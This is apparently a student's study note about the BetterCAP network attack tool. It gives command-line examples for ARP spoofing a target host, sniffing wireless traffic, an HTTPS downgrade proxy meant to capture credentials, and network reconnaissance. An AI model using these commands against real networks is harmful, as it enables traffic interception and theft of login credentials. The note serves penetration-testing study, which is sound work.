---
created:
  - 08-19-2024 14:19
backlink tags:
  - "[[002 - Areas/2.0 WGU 📝/D484/Tools]]"
---
# ❗ Information
**Related to:** Network Security, Penetration Testing, Ethical Hacking  
**Tags:** MITM, Sniffing, Spoofing, WiFi Hacking

# 💻 Application -> bettercap

## 🧾 Description
- BetterCAP is a powerful and flexible tool designed to perform various types of network attacks and security tests. It is primarily used for man-in-the-middle (MITM) attacks, network packet sniffing, protocol manipulation, and other network-related security assessments.

## 🌐 Link
- [BetterCAP Official Website](https://www.bettercap.org/)

## 🤸 Examples

### Example 1: Starting BetterCAP with Built-in Web Interface
```sh
sudo bettercap -caplet http-ui
```
This command starts BetterCAP with the built-in web interface enabled. You can navigate to `http://localhost:8081` in your web browser to access it.

### Example 2: Performing an ARP Spoofing Attack
```sh
sudo bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.1.10; arp.spoof on"
```
This command performs an ARP spoofing attack targeting the device with IP address `192.168.1.10` on the network interface `eth0`.

### Example 3: Sniffing Network Traffic
```sh
sudo bettercap -iface wlan0 -eval "net.sniff on"
```
This command starts sniffing all network traffic on the wireless interface `wlan0`.

### Example 4: Capturing HTTPS Credentials via HSTS Bypass (HTTPS downgrade attack)
```sh
sudo bettercap -iface eth0 -eval "https.proxy.script /path/to/proxy.js; https.proxy on"
```
This command sets up an HTTPS proxy with a JavaScript file for downgrading HTTPS connections to HTTP in order to capture credentials.

### Example 5: Scanning the Network for Devices
```sh
sudo bettercap -iface eth0 -eval "net.probe on; net.recon on"
```
This command enables probing and reconnaissance mode to scan and discover devices connected to the same network.

By using these examples as a foundation, you can perform various complex tasks using BetterCAP for your penetration testing and network security assessments. Always ensure that you have proper authorization before conducting any security tests or attacks.